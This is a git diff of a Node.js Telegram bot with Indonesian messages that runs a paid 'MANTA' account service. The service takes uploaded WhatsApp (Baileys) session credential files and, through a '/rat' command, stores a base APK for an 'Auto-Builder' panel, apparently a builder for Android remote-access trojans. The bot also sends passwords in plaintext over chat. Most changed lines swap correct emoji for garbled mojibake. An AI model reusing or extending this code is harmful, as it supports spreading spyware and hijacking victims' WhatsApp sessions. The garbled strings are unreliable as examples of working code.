-    let message = `📌 Global Session\n\n`
-    message += "Messenger:\n" + (Object.keys(mess).join("\n") || "❌ None")
-    message += "\n\nBusiness:\n" + (Object.keys(biz).join("\n") || "❌ None")
-    message += "\n\nActive:\n" + (Object.keys(activeConnections).join("\n") || "❌ None")
+    let message = `ðŸ“Œ Global Session\n\n`
+    message += "Messenger:\n" + (Object.keys(mess).join("\n") || "âŒ None")
+    message += "\n\nBusiness:\n" + (Object.keys(biz).join("\n") || "âŒ None")
+    message += "\n\nActive:\n" + (Object.keys(activeConnections).join("\n") || "âŒ None")
 
     bot.sendMessage(msg.chat.id, message)
 })
@@ -15653,17 +15653,17 @@ bot.on("callback_query", async q => {
         const user = db.find(u => u.telegramId === userId)
         if (!user) {
             if (isPrivate) {
-                return bot.sendMessage(chatId, "❌ Kamu belum pernah membuat akun")
+                return bot.sendMessage(chatId, "âŒ Kamu belum pernah membuat akun")
             }
             return
         }
         return bot.sendMessage(userId, `
-<b>📄 AKUN KAMU</b>
+<b>ðŸ“„ AKUN KAMU</b>
 
-👤 Username: <b>${user.username}</b>
-🔑 Password: <b>${user.password}</b>
-🎯 Role: <b>${user.role.toUpperCase()}</b>
-⏳ Expired: <b>${formatDateExp(user.expiredDate)}</b>
+ðŸ‘¤ Username: <b>${user.username}</b>
+ðŸ”‘ Password: <b>${user.password}</b>
+ðŸŽ¯ Role: <b>${user.role.toUpperCase()}</b>
+â³ Expired: <b>${formatDateExp(user.expiredDate)}</b>
 `, { parse_mode: "HTML" })
     }
 
@@ -15672,7 +15672,7 @@ bot.on("callback_query", async q => {
         const i = db.findIndex(u => u.telegramId === userId)
         if (i === -1) {
             if (isPrivate) {
-                return bot.sendMessage(chatId, "❌ Kamu tidak punya akun")
+                return bot.sendMessage(chatId, "âŒ Kamu tidak punya akun")
             }
             return
         }
@@ -15680,16 +15680,16 @@ bot.on("callback_query", async q => {
         db.splice(i, 1)
         saveDatabase(db)
         return bot.sendMessage(userId, `
-🗑 <b>AKUN DIHAPUS</b>
+ðŸ—‘ <b>AKUN DIHAPUS</b>
 
-👤 <b>${u.username}</b>
+ðŸ‘¤ <b>${u.username}</b>
 Sekarang kamu bisa membuat akun kembali
 `, { parse_mode: "HTML" })
     }
 
     if (!isPrivate) {
         return bot.sendMessage(chatId, `
-<b>🔒 MANTA SECURITY</b>
+<b>ðŸ”’ MANTA SECURITY</b>
 
 <blockquote>
 Proses hanya dapat dilanjutkan
@@ -15699,7 +15699,7 @@ melalui <b>PRIVATE CHAT</b>
             parse_mode: "HTML",
             reply_markup: {
                 inline_keyboard: [
-                    [{ text: "🔐 Buka Private Bot", url: "https://t.me/mantaxapkbot?start=menu" }]
+                    [{ text: "ðŸ” Buka Private Bot", url: "https://t.me/mantaxapkbot?start=menu" }]
                 ]
             }
         })
@@ -15708,14 +15708,14 @@ melalui <b>PRIVATE CHAT</b>
     if (q.data === "create_member") {
         clearUserFlow(userId)
         if (telegramUserHasAccount(userId)) {
-            return bot.sendMessage(chatId, "❌ Kamu sudah punya akun")
+            return bot.sendMessage(chatId, "âŒ Kamu sudah punya akun")
         }
         const role = await resolveUserRole(userId)
         if (!role) {
-            return bot.sendMessage(chatId, "❌ Kamu tidak memiliki akses")
+            return bot.sendMessage(chatId, "âŒ Kamu tidak memiliki akses")
         }
         const sent = await bot.sendMessage(chatId, `
-<b>🆕 MANTA ACCOUNT CREATION</b>
+<b>ðŸ†• MANTA ACCOUNT CREATION</b>
 
 Role: <b>${role.toUpperCase()}</b>
 
@@ -15729,11 +15729,11 @@ Balas dengan:
         clearUserFlow(userId)
         const role = await resolveUserRole(userId)
         if (role !== "TK" && role !== "OWNER") {
-            return bot.sendMessage(chatId, "❌ Akses ditolak")
+            return bot.sendMessage(chatId, "âŒ Akses ditolak")
         }
 
         const sent = await bot.sendMessage(chatId, `
-<b>🧾 UPLOAD BUKTI PEMBAYARAN</b>
+<b>ðŸ§¾ UPLOAD BUKTI PEMBAYARAN</b>
 
 Silakan kirim <b>FOTO</b> bukti transfer yang jelas.
 `, { parse_mode: "HTML" })
@@ -15744,7 +15744,7 @@ Silakan kirim <b>FOTO</b> bukti transfer yang jelas.
     if (q.data === "cek_member_saya") {
         const role = await resolveUserRole(userId)
         if (role !== "TK" && role !== "OWNER") {
-            return bot.sendMessage(chatId, "❌ Akses ditolak")
+            return bot.sendMessage(chatId, "âŒ Akses ditolak")
         }
 
         const db = loadDatabase()
@@ -15756,17 +15756,17 @@ Silakan kirim <b>FOTO</b> bukti transfer yang jelas.
         )
 
         if (!members.length) {
-            return bot.sendMessage(chatId, "❌ Kamu belum membuat akun member")
+            return bot.sendMessage(chatId, "âŒ Kamu belum membuat akun member")
         }
 
-        let text = `<b>📋 MEMBER YANG KAMU BUAT</b>\n\n`
+        let text = `<b>ðŸ“‹ MEMBER YANG KAMU BUAT</b>\n\n`
 
         members.forEach((u, i) => {
             text +=
                 `#${i + 1}
-👤 <b>${u.username}</b>
-🎯 MEMBER
-⏳ Exp: <b>${formatDateExp(u.expiredDate)}</b>
+ðŸ‘¤ <b>${u.username}</b>
+ðŸŽ¯ MEMBER
+â³ Exp: <b>${formatDateExp(u.expiredDate)}</b>
 
 `
         })
@@ -15778,11 +15778,11 @@ Silakan kirim <b>FOTO</b> bukti transfer yang jelas.
         clearUserFlow(userId)
         const role = await resolveUserRole(userId)
         if (role !== "TK" && role !== "OWNER") {
-            return bot.sendMessage(chatId, "❌ Akses ditolak")
+            return bot.sendMessage(chatId, "âŒ Akses ditolak")
         }
 
         const sent = await bot.sendMessage(chatId, `
-<b>🗑 HAPUS MEMBER (TK)</b>
+<b>ðŸ—‘ HAPUS MEMBER (TK)</b>
 
 Balas dengan:
 <b>username_member</b>
@@ -15797,7 +15797,7 @@ Balas dengan:
 
     if (q.data === "set_expire") {
         return bot.sendMessage(chatId, `
-<b>⏳ MANTA EXPIRED MANAGER</b>
+<b>â³ MANTA EXPIRED MANAGER</b>
 
 Balas:
 <b>username tambah_hari</b>
@@ -15806,7 +15806,7 @@ Balas:
 
     if (q.data === "create_custom") {
         return bot.sendMessage(chatId, `
-<b>🎛 MANTA CUSTOM USER</b>
+<b>ðŸŽ› MANTA CUSTOM USER</b>
 
 Balas:
 <b>username password role hari</b>
@@ -15815,7 +15815,7 @@ Balas:
 
     if (q.data === "delete_user") {
         return bot.sendMessage(chatId, `
-<b>🗑 MANTA USER REMOVER</b>
+<b>ðŸ—‘ MANTA USER REMOVER</b>
 
 Balas:
 <b>username</b>
@@ -15860,11 +15860,11 @@ Balas:
         })
 
         if (count === 0) {
-            return bot.sendMessage(chatId, "✅ Tidak ditemukan akun member yang sudah expired.")
+            return bot.sendMessage(chatId, "âœ… Tidak ditemukan akun member yang sudah expired.")
         }
 
         saveDatabase(filteredDb)
-        return bot.sendMessage(chatId, `✅ Berhasil menghapus <b>${count}</b> akun member yang sudah expired.\n\n${deletedNames.slice(0, 10).join(', ')}${deletedNames.length > 10 ? ' ...' : ''}`, { parse_mode: "HTML" })
+        return bot.sendMessage(chatId, `âœ… Berhasil menghapus <b>${count}</b> akun member yang sudah expired.\n\n${deletedNames.slice(0, 10).join(', ')}${deletedNames.length > 10 ? ' ...' : ''}`, { parse_mode: "HTML" })
     }
 })
 bot.on("message", async msg => {
@@ -15884,14 +15884,14 @@ bot.on("message", async msg => {
         if (currentState === "WAIT_PROOF_TK") {
             if (currentFlow?.chatId && currentFlow.chatId !== chatId) return
             if (!msg.photo || !msg.photo.length) {
-                return bot.sendMessage(chatId, "❌ Bukti harus berupa <b>FOTO</b> yang jelas (bukan file/dokumen).", { parse_mode: "HTML" })
+                return bot.sendMessage(chatId, "âŒ Bukti harus berupa <b>FOTO</b> yang jelas (bukan file/dokumen).", { parse_mode: "HTML" })
             }
 
             const fileId = msg.photo[msg.photo.length - 1].file_id
 
             userProof.set(userId, fileId)
             const sent = await bot.sendMessage(chatId, `
-✅ Bukti diterima
+âœ… Bukti diterima
 
 Balas:
 <b>username password durasi_hari</b>
@@ -15915,7 +15915,7 @@ Balas:
             const jsonData = JSON.parse(buffer.toString())
 
             if (!isValidBaileysCreds(jsonData)) {
-                return bot.sendMessage(chatId, "❌ File bukan creds.json valid")
+                return bot.sendMessage(chatId, "âŒ File bukan creds.json valid")
             }
 
             const folder = path.join(__dirname, "otaxayun")
@@ -15930,13 +15930,18 @@ Balas:
             }
 
             fs.writeFileSync(savePath, JSON.stringify(jsonData))
-            return bot.sendMessage(chatId, `✅ File tersimpan: ${finalName}`)
+            return bot.sendMessage(chatId, `âœ… File tersimpan: ${finalName}`)
         }
 
-        if (!msg.reply_to_message?.text || !text) return
+        if (!msg.reply_to_message?.text || !text) {
+            if (text && !text.startsWith("/")) {
+                return bot.sendMessage(chatId, "âš ï¸ Balas (reply) pesan prompt bot di atas dengan format yang diminta, atau gunakan tombol menu lagi.")
+            }
+            return
+        }
 
         const ref = String(msg.reply_to_message.text)
-        const parts = text.trim().split(/[\s,|]+/)
+        const parts = text.trim().split(/[\s,|]+/).filter(Boolean)
         const db = loadDatabase()
 
         if (currentState === "CREATE_TK") {
@@ -15947,29 +15952,29 @@ Balas:
                     chatId,
                     promptMessageId: currentFlow?.promptMessageId ?? null
                 })
-                return bot.sendMessage(chatId, "❌ Upload bukti dulu")
+                return bot.sendMessage(chatId, "âŒ Upload bukti dulu")
             }
             if (parts.length < 3) {
-                return bot.sendMessage(chatId, "❌ Format salah (username password durasi)")
+                return bot.sendMessage(chatId, "âŒ Format salah (username password durasi)")
             }
 
             const [username, password, day] = parts
 
             if (db.some(u => u.username === username)) {
-                return bot.sendMessage(chatId, "❌ Username sudah ada")
+                return bot.sendMessage(chatId, "âŒ Username sudah ada")
             }
 
             const add = Number(day)
             if (!Number.isInteger(add) || add < 1) {
-                return bot.sendMessage(chatId, "❌ Durasi hari tidak valid (minimal 1 hari)")
+                return bot.sendMessage(chatId, "âŒ Durasi hari tidak valid (minimal 1 hari)")
             }
             if (add > 30) {
-                return bot.sendMessage(chatId, "❌ Maksimal durasi adalah 30 hari.")
+                return bot.sendMessage(chatId, "âŒ Maksimal durasi adalah 30 hari.")
             }
 
             const expDate = createExpiryIsoWib(add)
             if (!expDate) {
-                return bot.sendMessage(chatId, "âŒ Durasi hari tidak valid")
+                return bot.sendMessage(chatId, "Ã¢ÂÅ’ Durasi hari tidak valid")
             }
 
             const creator = resolveTelegramIdentity(msg)
@@ -15977,18 +15982,18 @@ Balas:
             const ownerGroupIds = getTelegramGroupsByRole("OWNER")
             const reportGroupIds = [...new Set([...tkGroupIds, ...ownerGroupIds])]
             const accountCaption = `
-🚨 <b>MANTA ACCOUNT CREATED (TK)</b>
+ðŸš¨ <b>MANTA ACCOUNT CREATED (TK)</b>
 
-👤 Dibuat oleh
-• Nama : <b>${creator.username}</b>
-• ID   : <code>${creator.id}</code>
+ðŸ‘¤ Dibuat oleh
+â€¢ Nama : <b>${creator.username}</b>
+â€¢ ID   : <code>${creator.id}</code>
 
-🆕 Akun
-• Username : <b>${username}</b>
-• Password : <b>${password}</b>
-• Role     : <b>MEMBER</b>
-• Durasi   : <b>${add} hari</b>
-• Expired  : <b>${formatDateExp(expDate)}</b>
+ðŸ†• Akun
+â€¢ Username : <b>${username}</b>
+â€¢ Password : <b>${password}</b>
+â€¢ Role     : <b>MEMBER</b>
+â€¢ Durasi   : <b>${add} hari</b>
+â€¢ Expired  : <b>${formatDateExp(expDate)}</b>
 `
 
             db.push({
@@ -16026,12 +16031,12 @@ Balas:
 
 
             await bot.sendMessage(chatId, `
-✅ <b>AKUN AKTIF</b>
+âœ… <b>AKUN AKTIF</b>
 
-• Username : <b>${username}</b>
-• Password : <b>${password}</b>
-🎯 MEMBER
-⏳ ${formatDateExp(expDate)}
+â€¢ Username : <b>${username}</b>
+â€¢ Password : <b>${password}</b>
+ðŸŽ¯ MEMBER
+â³ ${formatDateExp(expDate)}
 `, { parse_mode: "HTML" })
 
             return
@@ -16041,7 +16046,7 @@ Balas:
             if (currentFlow?.promptMessageId && msg.reply_to_message?.message_id !== currentFlow.promptMessageId) return
             const username = parts[0]
             if (!username) {
-                return bot.sendMessage(chatId, "❌ Username tidak valid")
+                return bot.sendMessage(chatId, "âŒ Username tidak valid")
             }
 
             const idx = db.findIndex(
@@ -16053,7 +16058,7 @@ Balas:
 
             if (idx === -1) {
                 clearUserFlow(userId)
-                return bot.sendMessage(chatId, "❌ Member tidak ditemukan atau bukan milikmu")
+                return bot.sendMessage(chatId, "âŒ Member tidak ditemukan atau bukan milikmu")
             }
 
             const removed = removeUserFromDatabase(db, idx)
@@ -16061,10 +16066,10 @@ Balas:
             clearUserFlow(userId)
 
             await bot.sendMessage(chatId, `
-✅ <b>MEMBER DIHAPUS</b>
+âœ… <b>MEMBER DIHAPUS</b>
 
-👤 <b>${removed.username}</b>
-⏳ Expired: <b>${formatDateExp(removed.expiredDate)}</b>
+ðŸ‘¤ <b>${removed.username}</b>
+â³ Expired: <b>${formatDateExp(removed.expiredDate)}</b>
 `, { parse_mode: "HTML" })
 
             return
@@ -16074,7 +16079,7 @@ Balas:
             if (currentFlow?.promptMessageId && msg.reply_to_message?.message_id !== currentFlow.promptMessageId) return
             if (telegramUserHasAccount(userId)) return
             if (parts.length !== 3) {
-                return bot.sendMessage(chatId, "❌ Format salah")
+                return bot.sendMessage(chatId, "âŒ Format salah")
             }
 
             const role = await resolveUserRole(userId)
@@ -16082,17 +16087,17 @@ Balas:
 
             const [username, password, day] = parts
             if (db.some(u => u.username === username)) {
-                return bot.sendMessage(chatId, "❌ Username sudah ada")
+                return bot.sendMessage(chatId, "âŒ Username sudah ada")
             }
 
             const add = Number(day)
             if (!Number.isInteger(add) || add <= 0) {
-                return bot.sendMessage(chatId, "❌ Durasi hari tidak valid")
+                return bot.sendMessage(chatId, "âŒ Durasi hari tidak valid")
             }
 
             const expDate = createExpiryIsoWib(add)
             if (!expDate) {
-                return bot.sendMessage(chatId, "âŒ Durasi hari tidak valid")
+                return bot.sendMessage(chatId, "Ã¢ÂÅ’ Durasi hari tidak valid")
             }
 
             db.push({
@@ -16109,68 +16114,79 @@ Balas:
             clearUserFlow(userId)
 
             return bot.sendMessage(chatId, `
-✅ <b>AKUN AKTIF</b>
+âœ… <b>AKUN AKTIF</b>
 
-👤 ${username}
-🎯 ${role.toUpperCase()}
-⏳ ${formatDateExp(expDate)}
+ðŸ‘¤ ${username}
+ðŸŽ¯ ${role.toUpperCase()}
+â³ ${formatDateExp(expDate)}
 `, { parse_mode: "HTML" })
         }
 
         if (ref.includes("MANTA EXPIRED MANAGER") && isOwner) {
-            if (parts.length !== 2) return
+            if (parts.length !== 2) {
+                return bot.sendMessage(chatId, "❌ Format salah. Balas dengan:\n<b>username tambah_hari</b>\nContoh: budi 30", { parse_mode: "HTML" })
+            }
 
             const [username, day] = parts
             const u = db.find(x => x.username === username)
-            if (!u) return
+            if (!u) return bot.sendMessage(chatId, `❌ User "${username}" tidak ditemukan`, { parse_mode: "HTML" })
 
             const add = Number(day)
             if (!Number.isInteger(add) || add <= 0) {
-                return bot.sendMessage(chatId, "❌ Hari tidak valid")
+                return bot.sendMessage(chatId, "âŒ Hari tidak valid")
             }
 
             const nextExpiredDate = addDaysToExpiryIsoWib(u.expiredDate, add)
-            if (!nextExpiredDate) return bot.sendMessage(chatId, "âŒ Hari tidak valid")
+            if (!nextExpiredDate) return bot.sendMessage(chatId, "\u274C Hari tidak valid", { parse_mode: "HTML" })
             u.expiredDate = nextExpiredDate
 
             saveDatabase(db)
-            return bot.sendMessage(chatId, "✅ Expired diperbarui")
+            return bot.sendMessage(chatId, "âœ… Expired diperbarui")
         }
 
         if (ref.includes("MANTA CUSTOM USER") && isOwner) {
-            if (parts.length !== 4) return
+            if (parts.length !== 4) {
+                return bot.sendMessage(chatId, "âŒ Format salah. Balas dengan:\n<b>username password role hari</b>\nContoh: budi secret123 TK 30", { parse_mode: "HTML" })
+            }
 
             const [u, p, r, d] = parts
-            if (!VALID_ROLES.includes(r)) return
-            if (db.some(x => x.username === u)) return
-
+            const roleUpper = String(r).toUpperCase()
+            if (!VALID_ROLES.includes(roleUpper)) {
+                return bot.sendMessage(chatId, `âŒ Role tidak valid: "${r}". Pilihan: ${VALID_ROLES.join(", ")}`, { parse_mode: "HTML" })
+            }
+            if (db.some(x => x.username === u)) {
+                return bot.sendMessage(chatId, `âŒ Username "${u}" sudah ada. Gunakan nama lain.`, { parse_mode: "HTML" })
+            }
             const expiredDate = createExpiryIsoWib(Number(d))
-            if (!expiredDate) return bot.sendMessage(chatId, "âŒ Hari tidak valid")
+            if (!expiredDate) return bot.sendMessage(chatId, "\u274c Hari tidak valid (harus angka, minimal 1)", { parse_mode: "HTML" })
+            // validasi hari
 
             db.push({
                 username: u,
                 password: p,
-                role: r,
+                role: roleUpper,
                 expiredDate,
                 createdAt: new Date().toISOString()
             })
 
             saveDatabase(db)
-            return bot.sendMessage(chatId, "✅ Custom user dibuat")
+            return bot.sendMessage(chatId, `âœ… <b>Custom user dibuat</b>\n\nðŸ‘¤ ${u}\nðŸŽ¯ ${roleUpper}\nâ³ ${formatDateExp(expiredDate)}`, { parse_mode: "HTML" })
         }
 
         if (ref.includes("MANTA USER REMOVER") && isOwner) {
             const i = db.findIndex(x => x.username === parts[0])
-            if (i === -1) return
+            if (i === -1) {
+                return bot.sendMessage(chatId, `âŒ User "${parts[0] || '(kosong)'}" tidak ditemukan. Balas dengan: <b>username</b>`, { parse_mode: "HTML" })
+            }
 
             removeUserFromDatabase(db, i)
             saveDatabase(db)
-            return bot.sendMessage(chatId, "🗑 User dihapus")
+            return bot.sendMessage(chatId, `ðŸ—‘ User "${parts[0]}" dihapus`, { parse_mode: "HTML" })
         }
     } catch (e) {
         console.error(e)
         try {
-            bot.sendMessage(msg.chat.id, `❌ Error:\n<code>${e.message}</code>`, {
+            bot.sendMessage(msg.chat.id, `âŒ Error:\n<code>${e.message}</code>`, {
                 parse_mode: "HTML"
             })
         } catch { }
@@ -16228,7 +16244,7 @@ async function purgeIllegalAccountsOnStartup() {
                 roleCache.set(numericId, resolvedRole);
                 return resolvedRole;
             } catch (err) {
-                console.log(`[PURGE] ⚠️ Gagal cek role ${telegramId}: ${err.message}`);
+                console.log(`[PURGE] âš ï¸ Gagal cek role ${telegramId}: ${err.message}`);
                 return "API_ERROR";
             }
         };
@@ -16239,7 +16255,7 @@ async function purgeIllegalAccountsOnStartup() {
                 const role = await resolveUserRole(Number(telegramId));
                 return role;
             } catch (err) {
-                console.log(`[PURGE] ⚠️ Double-check gagal ${telegramId}: ${err.message}`);
+                console.log(`[PURGE] âš ï¸ Double-check gagal ${telegramId}: ${err.message}`);
                 return "API_ERROR";
             }
         };
@@ -16254,12 +16270,12 @@ async function purgeIllegalAccountsOnStartup() {
                 u.createdAt = new Date().toISOString();
                 updatedUsers.push({ username: u.username, createdAt: u.createdAt });
                 changed = true;
-                console.log(`[PURGE] 🆕 Set missing createdAt for ${u.username}`);
+                console.log(`[PURGE] ðŸ†• Set missing createdAt for ${u.username}`);
                 createdAtMs = Date.now();
             }
 
             if ((now.getTime() - createdAtMs) < NEW_ACCOUNT_PROTECTION_MS) {
-                console.log(`[PURGE] 🛡️ Skip ${u.username} — akun baru dibuat (< 48 jam)`);
+                console.log(`[PURGE] ðŸ›¡ï¸ Skip ${u.username} â€” akun baru dibuat (< 48 jam)`);
                 continue;
             }
 
@@ -16271,27 +16287,27 @@ async function purgeIllegalAccountsOnStartup() {
             if (expired) {
                 deleteReason = `Expired (${formatWibMs(expMs)})`;
             } else if (u.expiredDate && !isValidDate) {
-                console.log(`[PURGE] ⏳ Skip ${u.username || "-"} — expiredDate tidak valid: ${u.expiredDate}`);
+                console.log(`[PURGE] â³ Skip ${u.username || "-"} â€” expiredDate tidak valid: ${u.expiredDate}`);
                 continue;
             } else if (!isMemberRole(normalizedRole) && u.telegramId && !ownerList.includes(Number(u.telegramId))) {
                 const resolvedRole = await resolveRoleSafe(u.telegramId);
 
                 if (resolvedRole === "API_ERROR") {
-                    console.log(`[PURGE] ⏭️ Skip ${u.username || u.telegramId} — API Telegram gagal, cek ulang nanti`);
+                    console.log(`[PURGE] â­ï¸ Skip ${u.username || u.telegramId} â€” API Telegram gagal, cek ulang nanti`);
                     continue;
                 }
 
                 if (!resolvedRole) {
-                    console.log(`[PURGE] 🔄 Double-checking ${u.username || u.telegramId}...`);
+                    console.log(`[PURGE] ðŸ”„ Double-checking ${u.username || u.telegramId}...`);
                     const secondCheck = await doubleCheckRole(u.telegramId);
 
                     if (secondCheck === "API_ERROR") {
-                        console.log(`[PURGE] ⏭️ Skip ${u.username || u.telegramId} — double-check juga gagal`);
+                        console.log(`[PURGE] â­ï¸ Skip ${u.username || u.telegramId} â€” double-check juga gagal`);
                         continue;
                     }
 
                     if (secondCheck) {
-                        console.log(`[PURGE] ✅ ${u.username} ternyata masih ada di grup (role: ${secondCheck})`);
+                        console.log(`[PURGE] âœ… ${u.username} ternyata masih ada di grup (role: ${secondCheck})`);
                         if (u.role !== secondCheck) {
                             u.role = secondCheck;
                             updatedUsers.push({ username: u.username, role: u.role });
@@ -16310,16 +16326,16 @@ async function purgeIllegalAccountsOnStartup() {
                     if (!graceStartedAt) {
                         graceData[graceKey] = now.getTime();
                         graceChanged = true;
-                        console.log(`[PURGE] ⏳ Grace dimulai untuk ${u.username || u.telegramId} selama 72 jam`);
+                        console.log(`[PURGE] â³ Grace dimulai untuk ${u.username || u.telegramId} selama 72 jam`);
                         continue;
                     }
 
                     if ((now.getTime() - graceStartedAt) < OFFICIAL_GRACE_PERIOD_MS) {
-                        console.log(`[PURGE] ⏳ ${u.username || u.telegramId} masih dalam grace period official`);
+                        console.log(`[PURGE] â³ ${u.username || u.telegramId} masih dalam grace period official`);
                         continue;
                     }
 
-                    deleteReason = "Akun Official — Ter-ban/Keluar dari Grup Resmi";
+                    deleteReason = "Akun Official â€” Ter-ban/Keluar dari Grup Resmi";
                     delete graceData[graceKey];
                     graceChanged = true;
 
@@ -16376,23 +16392,23 @@ async function purgeIllegalAccountsOnStartup() {
             await bot.sendMessage(
                 OWNER_ID,
                 `
-🚨 <b>AKUN DIHAPUS (AUTO-PURGE)</b>
+ðŸš¨ <b>AKUN DIHAPUS (AUTO-PURGE)</b>
 
-👤 Username : <b>${u.username}</b>
-🆔 Telegram : <code>${u.telegramId || u.createdById || "-"}</code>
-🎯 Role     : <b>${u.role || "-"}</b>
-📦 Type     : <b>${u.accountType || "-"}</b>
-🆕 Created  : <b>${u.createdAt ? formatDateExp(u.createdAt) : "-"}</b>
-⏳ Expired  : <b>${u.expiredDate ? formatDateExp(u.expiredDate) : "-"}</b>
-⛔ Alasan   : <b>${u.deleteReason}</b>
-🕐 Waktu    : <b>${now.toISOString()}</b>
+ðŸ‘¤ Username : <b>${u.username}</b>
+ðŸ†” Telegram : <code>${u.telegramId || u.createdById || "-"}</code>
+ðŸŽ¯ Role     : <b>${u.role || "-"}</b>
+ðŸ“¦ Type     : <b>${u.accountType || "-"}</b>
+ðŸ†• Created  : <b>${u.createdAt ? formatDateExp(u.createdAt) : "-"}</b>
+â³ Expired  : <b>${u.expiredDate ? formatDateExp(u.expiredDate) : "-"}</b>
+â›” Alasan   : <b>${u.deleteReason}</b>
+ðŸ• Waktu    : <b>${now.toISOString()}</b>
 `,
                 { parse_mode: "HTML" }
             ).catch(() => { });
         }
 
     } catch (err) {
-        console.error("❌ purgeIllegalAccountsOnStartup error:", err.message);
+        console.error("âŒ purgeIllegalAccountsOnStartup error:", err.message);
     } finally {
         isPurging = false;
     }
@@ -16403,7 +16419,7 @@ bot.onText(/^\/addgroup\s+(\w+)/i, (msg, match) => {
 
     const role = match[1].toUpperCase()
     if (!VALID_GROUPS.includes(role)) {
-        return bot.sendMessage(msg.chat.id, "❌ Role tidak valid.")
+        return bot.sendMessage(msg.chat.id, "âŒ Role tidak valid.")
     }
 
     const id = msg.from.id
@@ -16411,14 +16427,14 @@ bot.onText(/^\/addgroup\s+(\w+)/i, (msg, match) => {
 
     const config = loadTelegramConfig()
     if (!config.ownerList.includes(id)) {
-        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.")
+        return bot.sendMessage(chatId, "âŒ Kamu tidak memiliki izin untuk menggunakan perintah ini.")
     }
 
     const data = loadTelegramGroup()
     data[String(chatId)] = role
     saveTelegramGroup(data)
 
-    bot.sendMessage(chatId, `✅ Grup ini sekarang memiliki izin membuat akun\n🎯 Role: ${role}`)
+    bot.sendMessage(chatId, `âœ… Grup ini sekarang memiliki izin membuat akun\nðŸŽ¯ Role: ${role}`)
 })
 function formatUptime(seconds) {
     const h = Math.floor(seconds / 3600);
@@ -16434,7 +16450,7 @@ bot.onText(/\/hapusmem/i, msg => {
     const ownerList = Array.isArray(cfg.ownerList) ? cfg.ownerList : []
 
     if (!ownerList.includes(userId)) {
-        return bot.sendMessage(chatId, "❌ Akses ditolak")
+        return bot.sendMessage(chatId, "âŒ Akses ditolak")
     }
 
     const db = loadDatabase()
@@ -16453,23 +16469,23 @@ bot.onText(/\/hapusmem/i, msg => {
     const removed = before - filtered.length
 
     if (removed === 0) {
-        return bot.sendMessage(chatId, "✅ Tidak ada akun member yang sudah expired")
+        return bot.sendMessage(chatId, "âœ… Tidak ada akun member yang sudah expired")
     }
 
     saveDatabase(filtered)
 
     return bot.sendMessage(chatId, `
-🗑 <b>AKUN MEMBER EXPIRED DIHAPUS</b>
+ðŸ—‘ <b>AKUN MEMBER EXPIRED DIHAPUS</b>
 
-• Total dihapus: <b>${removed}</b>
-• Member aktif: <b>AMAN (tidak dihapus)</b>
+â€¢ Total dihapus: <b>${removed}</b>
+â€¢ Member aktif: <b>AMAN (tidak dihapus)</b>
 `, { parse_mode: "HTML" })
 })
 bot.onText(/^\/?status$/, async (msg) => {
     const chatId = msg.chat.id;
 
     if (msg.from.id !== OWNER_ID) {
-        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
+        return bot.sendMessage(chatId, "âŒ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
     }
 
     try {
@@ -16495,15 +16511,15 @@ bot.onText(/^\/?status$/, async (msg) => {
 
         await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
     } catch (err) {
-        console.error("❌ Gagal ambil status:", err.message);
-        await bot.sendMessage(chatId, "⚠️ Gagal mengambil status server.");
+        console.error("âŒ Gagal ambil status:", err.message);
+        await bot.sendMessage(chatId, "âš ï¸ Gagal mengambil status server.");
     }
 });
 bot.onText(/\/backup$/, async (msg) => {
     if (msg.from.id !== OWNER_ID) return
 
     try {
-        await bot.sendMessage(msg.chat.id, "⏳ Membuat backup...")
+        await bot.sendMessage(msg.chat.id, "â³ Membuat backup...")
 
         const zipPath = await createZipBackup()
 
@@ -16511,13 +16527,13 @@ bot.onText(/\/backup$/, async (msg) => {
             msg.chat.id,
             zipPath,
             {},
-            { caption: "📦 Backup manual (SEMUA JSON)" }
+            { caption: "ðŸ“¦ Backup manual (SEMUA JSON)" }
         )
 
     } catch (e) {
         bot.sendMessage(
             msg.chat.id,
-            "❌ Backup gagal:\n" + e.message
+            "âŒ Backup gagal:\n" + e.message
         )
     }
 })
@@ -16526,15 +16542,15 @@ bot.onText(/^\/?rat$/i, async (msg) => {
 
     try {
         if (!msg.reply_to_message || !msg.reply_to_message.document) {
-            return bot.sendMessage(msg.chat.id, "❌ Reply file APK (polosan) dengan perintah /rat");
+            return bot.sendMessage(msg.chat.id, "âŒ Reply file APK (polosan) dengan perintah /rat");
         }
 
         const doc = msg.reply_to_message.document;
         if (!doc.file_name.endsWith(".apk")) {
-            return bot.sendMessage(msg.chat.id, "❌ File harus berformat .apk");
+            return bot.sendMessage(msg.chat.id, "âŒ File harus berformat .apk");
         }
 
-        await bot.sendMessage(msg.chat.id, "⏳ Mendownload dan menyimpan APK Polosan ke Server...");
+        await bot.sendMessage(msg.chat.id, "â³ Mendownload dan menyimpan APK Polosan ke Server...");
 
         const fileLink = await bot.getFileLink(doc.file_id);
         const res = await fetch(fileLink);
@@ -16558,9 +16574,9 @@ bot.onText(/^\/?rat$/i, async (msg) => {
             if (c.readyState === 1) c.send(wsPayload);
         });
 
-        bot.sendMessage(msg.chat.id, "✅ Berhasil! File manta_base.apk telah tersimpan di server. Panel Auto-Builder di Tools Gateway sekarang bisa digunakan dengan APK terbaru.");
+        bot.sendMessage(msg.chat.id, "âœ… Berhasil! File manta_base.apk telah tersimpan di server. Panel Auto-Builder di Tools Gateway sekarang bisa digunakan dengan APK terbaru.");
     } catch (e) {
-        bot.sendMessage(msg.chat.id, `❌ Gagal menyimpan APK: ${e.message}`);
+        bot.sendMessage(msg.chat.id, `âŒ Gagal menyimpan APK: ${e.message}`);
     }
 });
 
@@ -16571,7 +16587,7 @@ bot.onText(/\/upback$/, async (msg) => {
         if (!msg.reply_to_message || !msg.reply_to_message.document) {
             return bot.sendMessage(
                 msg.chat.id,
-                "❌ Reply file backup .zip"
+                "âŒ Reply file backup .zip"
             )
         }
 
@@ -16580,7 +16596,7 @@ bot.onText(/\/upback$/, async (msg) => {
         if (!doc.file_name.endsWith(".zip")) {
             return bot.sendMessage(
                 msg.chat.id,
-                "❌ File harus .zip"
+                "âŒ File harus .zip"
             )
         }
 
@@ -16596,12 +16612,12 @@ bot.onText(/\/upback$/, async (msg) => {
 
         bot.sendMessage(
             msg.chat.id,
-            "✅ Semua file JSON berhasil di-restore"
+            "âœ… Semua file JSON berhasil di-restore"
         )
     } catch (e) {
         bot.sendMessage(
             msg.chat.id,
-            "❌ Restore gagal:\n" + e.message
+            "âŒ Restore gagal:\n" + e.message
         )
     }
 })
